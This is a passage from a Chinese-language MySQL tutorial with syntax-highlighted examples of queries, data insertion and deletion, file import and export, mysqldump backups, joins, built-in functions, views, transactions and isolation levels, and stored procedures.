mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name LIKE <span class="string">'Vol%'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name LIKE <span class="string">'____'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name REGEXP <span class="string">'e.$'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Name REGEXP <span class="string">'^.e.*e.$'</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost BETWEEN <span class="number">20000</span> <span class="keyword">AND</span> <span class="number">55000</span>;
</code></pre><h3 id="优先级">优先级</h3><p>加个括号吧</p>
<p>同级运算符从左到右执行</p>
<h2 id="插入、更新和删除数据">插入、更新和删除数据</h2><h2 id="插入">插入</h2><p>插入时可以指定插入的列，也可以不指定</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books(Id, Title, Auth<span class="subst">or</span>) VALUES(<span class="number">1</span>, <span class="string">'War and Peace'</span>, 
<span class="subst">-&gt; </span><span class="string">'Leo Tolstoy'</span>);
mysql&gt; INSERT <span class="keyword">INTO</span> Books VALUES(<span class="number">3</span>, <span class="string">'Crime and Punishment'</span>,
<span class="subst">-&gt; </span><span class="string">'Fyodor Dostoyevsky'</span>);
</code></pre><p>若不指定<code>Id</code>也可。</p>
<pre><code>mysql&gt; INSERT INTO Books<span class="list">(<span class="keyword">Title</span>, Author)</span> VALUES <span class="list">(<span class="quoted">'The</span> Brothers Karamazov',
-&gt; <span class="quoted">'Fyodor</span> Dostoyevsky')</span><span class="comment">;</span>
</code></pre><p>一次可以插入单个或多个值</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books(Title, Auth<span class="subst">or</span>) VALUES (<span class="string">'The Insulted and Humiliated'</span>,
<span class="subst">-&gt; </span><span class="string">'Fyodor Dostoyevsky'</span>), (<span class="string">'Cousin Bette'</span>, <span class="string">'Honore de Balzac'</span>);
</code></pre><p><code>REPLACE</code>可以取代特定行：</p>
<pre><code>mysql&gt; REPLACE INTO <span class="function">Books <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'Paradise Lost'</span>, <span class="string">'John Milton'</span>)</span></span>;
</code></pre><p>插入也可以和<code>SELECT</code>结合：</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Books2 <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Books;
</code></pre><p>可以使用<code>LOAD DATA INFILE</code>和<code>LOAD XML INFILE</code>语法从文件插入：</p>
<pre><code>mysql&gt; LOAD <span class="built_in">DATA</span> INFILE <span class="string">'/tmp/books.csv'</span>    
    <span class="subst">-&gt; </span><span class="keyword">INTO</span> TABLE Books    
    <span class="subst">-&gt; </span>FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">','</span>    
    <span class="subst">-&gt; </span>LINES TERMINATED <span class="keyword">BY</span> <span class="string">'\n'</span>;

mysql&gt; LOAD <span class="built_in">XML</span> INFILE <span class="string">'/home/vronskij/programming/mysql/books.xml'</span> <span class="keyword">INTO</span> TABLE Books;
</code></pre><h3 id="删除">删除</h3><p>从表中删除：</p>
<pre><code>mysql&gt; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> Books2 WHERE Id=<span class="number">1</span>;
mysql&gt; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> Books2;
mysql&gt; TRUNCATE Books2;
</code></pre><h3 id="更新">更新</h3><p><code>UPDATE</code>用于变更选中行的列值。</p>
<p>mysql&gt; UPDATE Books SET Author=’Lev Nikolayevich Tolstoy’<br>    -&gt; WHERE Id=1;</p>
<h2 id="SELECT语句">SELECT语句</h2><h3 id="获取数据">获取数据</h3><p>选择所有内容</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;
</code></pre><p>选择特定的列</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Cost <span class="keyword">FROM</span> Cars;
</code></pre><p>可以重命名列名：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Cost <span class="keyword">AS</span> Price <span class="keyword">FROM</span> Cars;
</code></pre><p>限制输出个数：</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">4</span>;
mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">2</span>, <span class="number">4</span>;
mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">4</span> OFFSET <span class="number">2</span>;  <span class="preprocessor"># 同上</span>
</code></pre><h3 id="排序数据">排序数据</h3><p>以降序(<code>DESC</code>)或升序(<code>ASC</code>)排序：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Cost <span class="keyword">FROM</span> Cars <span class="keyword">ORDER</span> <span class="keyword">BY</span> Cost <span class="keyword">DESC</span>;
</code></pre><h3 id="WHERE">WHERE</h3><p>WHERE语句就像个过滤器：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer=<span class="string">"Smith"</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer <span class="keyword">LIKE</span> <span class="string">"B%"</span>;
</code></pre><h3 id="移除重复项">移除重复项</h3><p><code>DISTINCT</code>从结果中选择唯一的结果集。</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Customer <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer <span class="keyword">LIKE</span> <span class="comment">'B%';</span>
</code></pre><p><code>COUNT</code>函数统计个数</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> COUNT(Customer) <span class="keyword">AS</span> <span class="string">"Orders by Brown"</span> <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer=<span class="string">"Brown"</span>;
</code></pre><h2 id="聚合数据">聚合数据</h2><p><code>GROUP BY</code>语句被用来结合值一样的数据库记录到一个单一的记录中。通常和聚合函数一起使用。</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> SUM(OrderPrice) <span class="keyword">AS</span> Total, Customer <span class="keyword">FROM</span> Orders <span class="keyword">GROUP</span> <span class="keyword">BY</span> Customer;
</code></pre><p>使用聚合函数时不能使用<code>WHERE</code>而是使用<code>HAVING</code>：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">SUM</span>(OrderPrice) AS Total, Customer FROM Orders
    <span class="subst">-&gt; </span><span class="keyword">GROUP</span> <span class="keyword">BY</span> Customer HAVING <span class="keyword">SUM</span>(OrderPrice)&gt;<span class="number">1000</span>;
</code></pre><h3 id="选择内容到文件">选择内容到文件</h3><p><code>SELECT</code>语句能被用来写入表到文件中：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">INTO</span> OUTFILE <span class="string">'/tmp/cars.txt'</span>
    <span class="subst">-&gt; </span>FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">','</span>
    <span class="subst">-&gt; </span>LINES TERMINATED <span class="keyword">BY</span> <span class="string">'\n'</span>
    <span class="subst">-&gt; </span>FROM Cars;
</code></pre><h2 id="子查询">子查询</h2><p>又称嵌套查询，可以和<code>INSERT</code>、<code>SELECT</code>、<code>UPDATE</code>和<code>DELETE</code>配合使用：</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Cars2 <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> 
-&gt; CustomerId=(<span class="keyword">SELECT</span> CustomerId <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span> Id=<span class="number">5</span>);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> CustomerId <span class="keyword">IN</span>    
-&gt; (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> CustomerId <span class="keyword">FROM</span> Reservations);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost &lt;
-&gt; (<span class="keyword">SELECT</span> AVG(Cost) <span class="keyword">FROM</span> Cars);
</code></pre><p><code>EXISTS</code>和<code>NOT EXISTS</code>：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> EXISTS
-&gt; (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span>
-&gt; Customers.CustomerId=Reservations.CustomerId);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> <span class="keyword">NOT</span> EXISTS    
-&gt; (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span> 
-&gt; Customers.CustomerId=Reservations.CustomerId);
</code></pre><h2 id="限制">限制</h2><p>限制用来限定列的类型。</p>
<p><code>NOT NULL</code>：</p>
<pre><code>mysql&gt; CREATE TABLE People(Id <span class="built_in">INTEGER</span>, LastName <span class="keyword">TEXT</span> <span class="keyword">NOT</span> NULL,
-&gt;                     FirstName <span class="keyword">TEXT</span> <span class="keyword">NOT</span> NULL, City VARCHAR(<span class="number">55</span>));
</code></pre><p><code>UNIQUE</code>：</p>
<pre><code>mysql&gt; CREATE TABLE Brands<span class="list">(<span class="keyword">Id</span> INTEGER, BrandName VARCHAR<span class="list">(<span class="number">30</span>)</span> UNIQUE)</span><span class="comment">;</span>
</code></pre><p><code>PRIMARY KEY</code>自动拥有<code>UNIQUE</code>和<code>NOT NULL</code>：</p>
<pre><code>mysql&gt; CREATE TABLE Brands<span class="list">(<span class="keyword">Id</span> INTEGER PRIMARY KEY, BrandName VARCHAR<span class="list">(<span class="number">30</span>)</span> UNIQUE)</span><span class="comment">;</span>
</code></pre><p><code>FOREIGN KEY</code>是指向另一个表主键的索引，用来联系两个表：</p>
<pre><code>mysql&gt; CREATE TABLE Books<span class="list">(<span class="keyword">BookId</span> INTEGER PRIMARY KEY, Title VARCHAR<span class="list">(<span class="number">50</span>)</span>,
    -&gt; AuthorId INTEGER, FOREIGN KEY<span class="list">(<span class="keyword">AuthorId</span>)</span> REFERENCES Authors<span class="list">(<span class="keyword">AuthorId</span>)</span>)</span>
    -&gt; type=InnoDB<span class="comment">;</span>
</code></pre><p><code>ENUM</code>可以是列出中的一个：</p>
<pre><code>mysql&gt; CREATE TABLE Shops<span class="list">(<span class="keyword">Id</span> INTEGER, Name VARCHAR<span class="list">(<span class="number">55</span>)</span>, 
    -&gt; Quality ENUM<span class="list">(<span class="quoted">'High</span>', <span class="quoted">'Average</span>', <span class="quoted">'Low</span>')</span>)</span><span class="comment">;</span>
</code></pre><p><code>SET</code>可以是零个或多个：</p>
<pre><code>mysql&gt; CREATE TABLE Students<span class="list">(<span class="keyword">Id</span> INTEGER, Name VARCHAR<span class="list">(<span class="number">55</span>)</span>, 
    -&gt; Certificates SET<span class="list">(<span class="quoted">'A1</span>', <span class="quoted">'A2</span>', <span class="quoted">'B1</span>', <span class="quoted">'C1</span>')</span>)</span><span class="comment">; </span>
</code></pre><p>注意插入时<code>Certificates</code>列的值用括号括起来，之间用逗号分隔且不能有空格。</p>
<pre><code>mysql&gt; INSERT INTO <span class="function">Students <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'Mark'</span>, <span class="string">'A1,A2,D1,D2'</span>)</span></span>;
</code></pre><h2 id="导出和导入数据">导出和导入数据</h2><p>简单导出到文件和导入到数据库：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">INTO</span> OUTFILE <span class="comment">'/tmp/cars';  # 空格分隔</span>
mysql&gt; LOAD DATA INFILE <span class="comment">'/tmp/cars.csv' INTO TABLE Cars</span>
-&gt; FIELDS TERMINATED <span class="keyword">BY</span> <span class="comment">',';</span>
</code></pre><p>导入到xml文件：</p>
<pre><code>$ mysql -uroot -p --<span class="keyword">xml</span> <span class="title">-e</span> 'SELECT * FROM mydb.Cars' &gt; /tmp/cars.<span class="keyword">xml</span>
<span class="title">mysql</span>&gt; LOAD <span class="keyword">XML</span> <span class="title">/tmp</span>/cars.<span class="keyword">xml</span> <span class="title">INTO</span> TABLE Cars;
</code></pre><p>使用mysqldump工具：</p>
<p>只保存数据结构：</p>
<pre><code>$ mysqldump -<span class="keyword">u</span> root -p --<span class="keyword">no</span>-data mydb &gt; bkp1.sql
</code></pre><p>只保存数据</p>
<pre><code>$ mysqldump -uroot -<span class="tag">p</span> --no-create-info mydb &gt; bkp2.sql
</code></pre><p>完整数据库</p>
<pre><code>$ mysqldump -uroot -<span class="tag">p</span> mydb &gt; bkp3.sql
</code></pre><p>恢复数据：</p>
<pre><code>mysql&gt; CREATE DATABASE mydb<span class="comment">;</span>
mysql&gt; USE mydb<span class="comment">;</span>
mysql&gt; source bkp3.sql
</code></pre><h2 id="连接表">连接表</h2><h3 id="内连接">内连接</h3><p>分<code>INNER JOIN</code>、<code>NATURAL INNER JOIN</code>和<code>CROSS INNER JOIN</code>三种， <code>INNER</code>关键字可省略。以下是<code>INNER JOIN</code></p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Day <span class="keyword">FROM</span> Customers <span class="keyword">AS</span> C <span class="keyword">JOIN</span> Reservations 
    -&gt; <span class="keyword">AS</span> R <span class="keyword">ON</span> C.CustomerId=R.CustomerId;
mysql&gt; <span class="keyword">SELECT</span> Name, Day <span class="keyword">FROM</span> Customers, Reservations
    -&gt; <span class="keyword">WHERE</span> Customers.CustomerId=Reservations.CustomerId;
</code></pre><p><code>CROSS JOIN</code>是两个表的笛卡尔乘积。</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers CROSS <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers, Reservations;
</code></pre><h3 id="外连接">外连接</h3><p>左内连，选取左边所有的值：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, <span class="built_in">Day</span> FROM Customers <span class="built_in">LEFT</span> <span class="built_in">JOIN</span> Reservations
    -&gt; <span class="keyword">ON</span> Customers.CustomerId=Reservations.CustomerId;
mysql&gt; <span class="keyword">SELECT</span> Name, <span class="built_in">Day</span> FROM Customers <span class="built_in">LEFT</span> <span class="built_in">JOIN</span> Reservations
    -&gt; USING (CustomerId);
</code></pre><p>右内连，同上，孤单的右边值对应的左边为<code>NULL</code></p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers RIGHT <span class="built_in">JOIN</span>
    -&gt; Reservations USING (CustomerId);
</code></pre><p>自然连，会把所有列连在一起：</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers NATURAL <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers 
    -&gt; NATURAL LEFT <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers
    -&gt; NATURAL RIGHT <span class="built_in">JOIN</span> Reservations;
</code></pre><h2 id="MySQL函数">MySQL函数</h2><h3 id="数学函数">数学函数</h3><pre><code>mysql&gt; <span class="tag">SELECT</span> <span class="function">RAND</span>(), <span class="function">ABS</span>(-3), <span class="function">PI</span>(), <span class="function">SIN</span>(0<span class="class">.5</span>),
     &gt; <span class="function">BIN</span>(22), <span class="function">OCT</span>(22), <span class="function">HEX</span>(22)
     &gt; <span class="function">CEIL</span>(11<span class="class">.256</span>), <span class="function">FLOOR</span>(11<span class="class">.256</span>), <span class="function">ROUND</span>(11<span class="class">.256</span>, 2),
     &gt; <span class="function">POW</span>(3, 3), <span class="function">SQRT</span>(9),
     &gt; <span class="function">DEGREES</span>(2*<span class="function">PI</span>());
</code></pre><h3 id="聚合函数">聚合函数</h3><pre><code>mysql&gt; SELECT MIN<span class="function"><span class="params">(Cost)</span>, <span class="title">MAX</span><span class="params">(Cost)</span>, <span class="title">AVG</span><span class="params">(Cost)</span>
    -&gt;</span> FROM Cars;
mysql&gt; SELECT SUM(Cost), COUNT(Id), STD(Cost),<span class="function"> 
    -&gt;</span> VARIANCE(Cost) FROM Cars;
</code></pre><h3 id="字符串函数">字符串函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> LENGTH(<span class="string">'ZetCode'</span>), UPPER(<span class="string">'ZetCode'</span>), LOWER(<span class="string">'ZetCode'</span>);
mysql&gt; <span class="keyword">SELECT</span> LPAD(RPAD(<span class="string">"ZetCode"</span>, <span class="number">10</span>, <span class="string">"*"</span>), <span class="number">13</span>, <span class="string">"*"</span>);
mysql&gt; <span class="keyword">SELECT</span> REVERSE(<span class="string">'ZetCode'</span>), REPEAT(<span class="string">'*'</span>, <span class="number">6</span>);
mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">'ZetCode'</span>, <span class="number">3</span>), <span class="keyword">RIGHT</span>(<span class="string">'ZetCode'</span>, <span class="number">3</span>), 
    -&gt; SUBSTRING(<span class="string">'ZetCode'</span>, <span class="number">3</span>, <span class="number">3</span>);
mysql&gt; <span class="keyword">SELECT</span> STRCMP(<span class="string">'byte'</span>, <span class="string">'byte'</span>), CONCAT(<span class="string">'three'</span>, <span class="string">' apples'</span>);
mysql&gt; <span class="keyword">SELECT</span> REPLACE(<span class="string">'basketball'</span>, <span class="string">'basket'</span>, <span class="string">'foot'</span>);
</code></pre><h3 id="日期时间函数">日期时间函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">DAYNAME</span>(<span class="string">'2011-01-23'</span>), <span class="keyword">YEAR</span>(<span class="string">'2011/01/23'</span>),
    -&gt; <span class="keyword">MONTHNAME</span>(<span class="string">'110123'</span>);
mysql&gt; <span class="keyword">SELECT</span> NOW();
mysql&gt; <span class="keyword">SELECT</span> CURTIME(), CURDATE();
mysql&gt; <span class="keyword">SELECT</span> DATEDIFF(<span class="string">'2011-3-12'</span>, <span class="string">'2011-1-12'</span>);
mysql&gt; <span class="keyword">SELECT</span> WEEKOFYEAR(<span class="string">'110123'</span>), <span class="keyword">WEEKDAY</span>(<span class="string">'110123'</span>),
    -&gt; QUARTER(<span class="string">'110123'</span>);
mysql&gt; <span class="keyword">SELECT</span> DATE_FORMAT(<span class="string">'110123'</span>, <span class="string">'%d-%m-%Y'</span>);
mysql&gt; <span class="keyword">SELECT</span> DATE_ADD(<span class="string">'110123'</span>, INTERVAL <span class="number">45</span> <span class="keyword">DAY</span>), 
    -&gt; SUBDATE(<span class="string">'110309'</span>, INTERVAL <span class="number">45</span> <span class="keyword">DAY</span>);
</code></pre><h3 id="系统函数">系统函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> VERSION(), DATABASE()<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> USER()<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> CHARSET(<span class="string">'ZetCode'</span>), COLLATION(<span class="string">'ZetCode'</span>)<span class="comment">;</span>
</code></pre><h2 id="MySQL视图">MySQL视图</h2><p>视图是一种从表中切取的特殊伪表。有以下限制：</p>
<ul>
<li><code>SELECT</code>不能包含子查询</li>
<li><code>SELECT</code>语句不能指向系统或用户变量</li>
<li>在定义中指向的任何表或视图必须存在</li>
<li>不能创建临时视图</li>
<li>一个视图不能被触发关联。</li>
</ul>
<p>创建、更改和删除视图：</p>
<pre><code>mysql&gt; CREATE VIEW CheapCars <span class="keyword">AS</span> 
    -&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost&lt;<span class="number">25000</span>;
mysql&gt; ALTER VIEW CheapCars <span class="keyword">AS</span> <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars
    -&gt; <span class="keyword">WHERE</span> Cost&lt;<span class="number">30000</span>;
mysql&gt; DROP VIEW CheapCars;
</code></pre><p>找到视图：</p>
<pre><code>mysql&gt; SHOW FULL TABLES;
mysql&gt; <span class="keyword">SELECT</span> TABLE_NAME, TABLE_TYPE <span class="keyword">FROM</span> information_schema.TABLES;
mysql&gt; <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.VIEWS;
</code></pre><p><code>UNION</code>被用来结合两个或更多<code>SELECT</code>语句得到的结果集，可以通过<code>UNION</code>创建视图</p>
<pre><code>mysql&gt; CREATE VIEW FavoriteCars <span class="keyword">AS</span>
    -&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">7</span>
    -&gt; UNION <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">4</span>
    -&gt; UNION <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">5</span>;
</code></pre><h2 id="事务">事务</h2><p>数据库并发操作控制单位。这些操作可以commit可以回滚。</p>
<p>解释下ACID。</p>
<h3 id="隔离级">隔离级</h3><ul>
<li>序列，一个接一个</li>
<li>重复读，读的时候其它事务没提交就没法修改，改的时候没提交其它事务就没法读，默认级别。</li>
<li>读提交。</li>
<li>读未提交。</li>
</ul>
<ol>
<li>脏读(事务没提交，提前读取)：脏读就是指当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。 </li>
<li>不可重复读(两次读的不一致) ：是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。例如，一个编辑人员两次读取同一文档，但在两次读取之间，作者重写了该文档。当编辑人员第二次读取文档时，文档已更改。原始读取不可重复。如果只有在作者全部完成编写后编辑人员才可以读取文档，则可以避免该问。</li>
<li>幻读 : 是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。例如，一个编辑人员更改作者提交的文档，但当生产部门将其更改内容合并到该文档的主复本时，发现作者已将未编辑的新材料添加到该文档中。如果在编辑人员和生产部门完成对原始文档的处理之前，任何人都不能将新材料添加到文档中，则可以避免该问题。 </li>
</ol>
<p>默认隔离级和可能出现情况：</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>Phantom read</th>
<th>Nonrepeatable read</th>
<th>Dirty read</th>
</tr>
</thead>
<tbody>
<tr>
<td>序列化</td>
<td>不可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
<tr>
<td>可重读</td>
<td>可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
<tr>
<td>读提交</td>
<td>可能</td>
<td>可能</td>
<td>不可能</td>
</tr>
<tr>
<td>读未提交</td>
<td>可能</td>
<td>可能</td>
<td>可能</td>
</tr>
</tbody>
</table>
<p>查看和选择隔离级别</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> @<span class="constant">@tx_isolation</span><span class="comment">;</span>
mysql&gt; SET TRANSACTION ISOLATION LEVEL SERIALIZABLE<span class="comment">;</span>
</code></pre><h3 id="自动提交">自动提交</h3><p>MySQL会自动提交不以<code>START</code>开头的<code>UPDATE</code>和<code>INSERT</code>语句。查看和设置当前设置：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> @<span class="constant">@autocommit</span><span class="comment">;</span>
mysql&gt; SET autocommit=<span class="number">0</span><span class="comment">;</span>
</code></pre><p>提交后的状态无法回滚。<code>ROLLBACK</code></p>
<h3 id="开始事务">开始事务</h3><p>自动提交的命令会被MySQL封装为一个单独的事务。我们也可以用<code>START</code>语句实现。</p>
<pre><code>mysql&gt; <span class="literal">START</span> TRANSACTION;
</code></pre><p>之后可以执行命令提交或者回滚：</p>
<p>提交</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">5</span>), (<span class="number">6</span>)<span class="comment">;</span>
mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">7</span>), (<span class="number">8</span>)<span class="comment">;</span>
mysql&gt; COMMIT<span class="comment">;</span>
</code></pre><p>回滚</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">5</span>), (<span class="number">6</span>)<span class="comment">;</span>
mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">7</span>), (<span class="number">8</span>)<span class="comment">;</span>
mysql&gt; ROLLBACK<span class="comment">;</span>
</code></pre><h2 id="在MySQL中存储例程">在MySQL中存储例程</h2><p>在MySQL中存在两种存储例程，一种是过程，一种是函数。</p>
<p>过程用<code>CALL</code>调用，不返回值。函数通过<code>SELECT</code>使用，返回值。</p>
<p>过程存储有利有弊。</p>
<h3 id="一个简单过程">一个简单过程</h3><p>创建<code>AllCars</code>g过程选取<code>Cars</code>表中所有内容：</p>
<pre><code>mysql&gt; <span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">AllCars</span><span class="params">()</span> <span class="title">SELECT</span> * <span class="title">FROM</span> <span class="title">Cars</span>;</span>
mysql&gt; CALL AllCars();
</code></pre><h3 id="一个简单函数">一个简单函数</h3><p>定义过程和函数最好的方法是一个单独的sql文件。以下是创建了一个<code>sql</code>文件。通过<code>CREATE FUNCTION</code>创建函数，通过<code>SELECT</code>语句调用。</p>
<pre><code><span class="comment">-- this function computes the area</span>
<span class="comment">-- of a circle; it takes a radius as</span>
<span class="comment">-- a parameter</span>

DELIMITER $$

<span class="operator"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> CircleArea;</span>

<span class="operator"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> CircleArea(r <span class="keyword">DOUBLE</span>) <span class="keyword">RETURNS</span> <span class="keyword">DOUBLE</span>
<span class="keyword">BEGIN</span>
    <span class="keyword">DECLARE</span> area <span class="keyword">DOUBLE</span>;</span>

    <span class="operator"><span class="keyword">SET</span> area = r * r * <span class="keyword">pi</span>();</span>
    RETURN area;
<span class="operator"><span class="keyword">END</span> 

$$

DELIMITER ;</span>
</code></pre><p>函数调用：</p>
<pre><code>mysql&gt; source circlearea.sql
mysql&gt; <span class="function">SELECT <span class="title">CircleArea</span><span class="params">(<span class="number">5.5</span>)</span></span>;
</code></pre><h3 id="过程参数">过程参数</h3><p>有三种参数内型：</p>
<ul>
<li>IN，传递给过程，只能在函数内修改</li>
<li>OUT，输出参数，并不从外部传递给过程</li>
<li>INOUT，混合内型，可以传递给过程来更改也可以在过程外部存取。</li>
</ul>
<p>在sql文件中定义过程：</p>
<pre><code>-- this <span class="function"><span class="keyword">procedure</span> <span class="title">computes</span> <span class="title">the</span> <span class="title">power</span> 
-- <span class="title">of</span> <span class="title">a</span> <span class="title">given</span> <span class="title">value</span>

<span class="title">DELIMITER</span> $$

<span class="title">DROP</span> <span class="title">PROCEDURE</span> <span class="title">IF</span> <span class="title">EXISTS</span> <span class="title">Pow</span>;</span>

<span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">Pow</span><span class="params">(<span class="keyword">IN</span> val DOUBLE, <span class="keyword">OUT</span> p DOUBLE)</span> 
<span class="title">BEGIN</span>
    <span class="title">SET</span> <span class="title">p</span> = <span class="title">val</span> * <span class="title">val</span>;</span>
<span class="keyword">END</span> 

$$

DELIMITER ;
</code></pre><p>调用：</p>
<pre><code>mysql&gt; source power.sql

mysql&gt; <span class="built_in">CALL</span> Pow(<span class="number">3</span>, <span class="constant">@p</span>)<span class="comment">;</span>

mysql&gt; <span class="keyword">SELECT</span> <span class="constant">@p</span><span class="comment">;</span>
</code></pre><h3 id="找到过程或函数">找到过程或函数</h3><p>通过<code>SHOW PROCEDURE STATUS</code>和<code>SHOW FUNCTION STATUS</code>查看。</p>
<p>或者</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> SPECIFIC_NAME from information_schema<span class="built_in">.</span>ROUTINES  
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> ROUTINE_TYPE=<span class="string">'PROCEDURE'</span>;
mysql&gt; <span class="keyword">SELECT</span> SPECIFIC_NAME from information_schema<span class="built_in">.</span>ROUTINES 
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> ROUTINE_TYPE=<span class="string">'FUNCTION'</span>;
</code></pre><h2 id="MySQL_C_API">MySQL C API</h2><p>MySQL有个C API</p>
<p>debian上要装这个：</p>
<pre><code>$ sudo apt-<span class="built_in">get</span> install libmysqlclient-<span class="built_in">dev</span>
</code></pre><p>我们只要在头文件中包含<code>mysql.h</code>，编译时以以下方式编译：</p>
